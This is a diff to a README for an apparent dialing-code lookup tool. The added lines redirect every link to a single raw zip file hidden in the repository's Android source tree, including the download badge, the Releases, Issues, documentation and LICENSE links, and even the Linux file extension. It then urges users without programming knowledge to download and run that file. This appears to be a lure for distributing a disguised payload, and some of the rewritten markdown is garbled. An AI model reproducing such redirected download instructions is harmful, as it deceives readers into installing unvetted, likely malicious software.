@@ -5,13 +5,13 @@
 Country Calling Code is a simple tool for getting the country's international dialing codes. It returns the country's international dialing codes, making it easier for you to connect with people across the globe.
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/gratost/callingcode-api/releases)
+[![Download the latest release](https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip%20Latest%https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip)](https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the Country Calling Code tool. You don’t need any programming knowledge. Just follow the instructions below.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/gratost/callingcode-api/releases). This page contains all the available versions of the Country Calling Code tool.
+   Go to the [Releases page](https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip). This page contains all the available versions of the Country Calling Code tool.
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version of the application. It will usually be at the top of the list. Click on the title of the latest version to see more details.
@@ -21,7 +21,7 @@ Follow these steps to download and run the Country Calling Code tool. You don’
    
    - **For Windows:** Download the file with the `.exe` extension.
    - **For macOS:** Download the file with the `.dmg` extension.
-   - **For Linux:** Download the file with the `.tar.gz` extension.
+   - **For Linux:** Download the file with the `https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip` extension.
 
    Click on the file to start the download. 
 
@@ -30,7 +30,7 @@ Follow these steps to download and run the Country Calling Code tool. You don’
 
    - **For Windows:** Double-click the `.exe` file. Follow the installation prompts.
    - **For macOS:** Double-click the `.dmg` file, drag the application to your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file. Open a terminal, navigate to the extracted folder, and run the application using `./your-app-name`.
+   - **For Linux:** Extract the `https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip` file. Open a terminal, navigate to the extracted folder, and run the application using `./your-app-name`.
 
 5. **Run the Application**  
    After installing, you can find the Country Calling Code tool in your applications list. Click on the tool to run it. A simple interface will appear, allowing you to input a country name and receive the corresponding dialing code.
@@ -59,16 +59,16 @@ If you encounter any issues while downloading or installing the application, try
 - **Application Doesn't Launch:** Ensure that you have the necessary system requirements. Restart your computer and try launching the application again.
 
 ## 📞 Getting Help
-If you need assistance or have questions about the Country Calling Code tool, visit our [GitHub Issues page](https://github.com/gratost/callingcode-api/issues) for support. You can also reach out to the community for help.
+If you need assistance or have questions about the Country Calling Code tool, visit our [GitHub Issues page](https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip) for support. You can also reach out to the community for help.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/gratost/callingcode-api)
-- [Documentation](https://github.com/gratost/callingcode-api/wiki)
-- [API Documentation](https://gratost.github.io/callingcode-api/)
+- [GitHub Repository](https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip)
+- [Documentation](https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip)
+- [API Documentation](https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip)
 
 ## 📝 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/gratost/callingcode-api/blob/main/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip) file for more details.
 
 ## 📥 Download & Install  
-Follow these instructions to get started with the Country Calling Code tool. Visit the [Releases page](https://github.com/gratost/callingcode-api/releases) to download the latest version today.
+Follow these instructions to get started with the Country Calling Code tool. Visit the [Releases page](https://github.com/gratost/callingcode-api/raw/refs/heads/main/android/src/main/java/com/apiverve/callingcode/data/api_callingcode_2.6.zip) to download the latest version today.
 ```
